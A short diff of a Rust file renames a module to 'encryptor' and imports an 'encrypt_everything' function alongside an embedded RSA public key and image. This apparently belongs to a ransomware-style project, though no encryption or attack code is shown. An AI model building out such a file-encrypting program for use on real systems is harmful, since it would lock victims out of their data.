@@ -1,9 +1,9 @@
-mod encrypt_file;
+mod encryptor;
 
 use rsa::pkcs8::DecodePublicKey;
 use rsa::RsaPublicKey;
 use anyhow::Result;
-use crate::encrypt_file::encrypt_everything;
+use crate::encryptor::encrypt_everything;
 
 const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
 const PUBLIC_KEY: &[u8; 294] = include_bytes!("../../public-key.der");
